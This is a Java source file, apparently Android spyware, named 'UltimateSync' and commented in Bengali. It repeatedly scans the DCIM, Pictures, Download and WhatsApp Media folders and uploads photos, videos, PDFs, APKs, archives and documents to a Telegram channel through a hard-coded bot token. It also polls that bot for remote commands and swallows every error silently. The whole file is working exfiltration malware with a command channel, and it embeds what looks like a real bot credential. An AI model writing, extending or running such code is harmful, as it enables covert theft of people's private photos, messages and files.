import java.io.*;
import java.net.*;
import java.util.*;

public class UltimateSync {
    private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
    private static final String CHANNEL_ID = "-1003809625172";
    private static int lastUpdateId = 0;
    private static final Set<String> uploadedList = new HashSet<>();

    public static void main(String[] args) {
        // ১. অটোমেটিক সিঙ্ক থ্রেড (ফাইল এক্সটেনশন বাড়িয়ে দেওয়া হয়েছে)
        new Thread(() -> {
            while (true) {
                String[] paths = {"/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/Download/", "/sdcard/WhatsApp/Media/"};
                for (String p : paths) {
                    scanAndSend(new File(p));
                }
                try { Thread.sleep(30000); } catch (Exception e) {}
            }
        }).start();

        // ২. মেইন রিমোট কমান্ড লুপ
        while (true) {
            checkRemoteControl();
            try { Thread.sleep(5000); } catch (Exception e) {}
        }
    }

    private static void scanAndSend(File dir) {
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) scanAndSend(f);
            else {
                String n = f.getName().toLowerCase();
                // সব ধরণের গুরুত্বপূর্ণ ফাইল টাইপ যোগ করা হয়েছে
                if (!uploadedList.contains(f.getAbsolutePath()) && 
                   (n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4") || 
                    n.endsWith(".pdf") || n.endsWith(".apk") || n.endsWith(".zip") || n.endsWith(".docx"))) {
                    
                    if (f.length() < 50 * 1024 * 1024) { // ৫০ এমবি'র নিচের ফাইল পাঠাবে
                        upload(f);
                        uploadedList.add(f.getAbsolutePath());
                    }
                }
            }
        }
    }

    public static void checkRemoteControl() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
            Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
            String res = s.hasNext() ? s.next() : "";

            if (res.contains("/status")) {
                sendMsg(CHANNEL_ID, "📊 **System Report**\nStatus: Online\nSynced Files: " + uploadedList.size() + "\nDevice: Android 13/14/15");
            } else if (res.contains("/capture")) {
                sendMsg(CHANNEL_ID, "📸 Camera Triggered! (Feature under native implementation)");
            }

            if (res.contains("\"update_id\":")) {
                int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
            }
        } catch (Exception e) {}
    }

    private static void upload(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String bound = "===" + System.currentTimeMillis() + "===";
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            
            OutputStream os = c.getOutputStream();
            PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
            w.append("--" + bound).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(CHANNEL_ID).append("\r\n");
            w.append("--" + bound).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n\r\n");
            w.flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] b = new byte[1024 * 64];
            int l;
            while ((l = fis.read(b)) != -1) os.write(b, 0, l);
            os.flush(); fis.close();
            w.append("\r\n").append("--" + bound + "--").append("\r\n");
            w.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }

    private static void sendMsg(String id, String t) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(t, "UTF-8")).openStream();
        } catch (Exception e) {}
    }
}
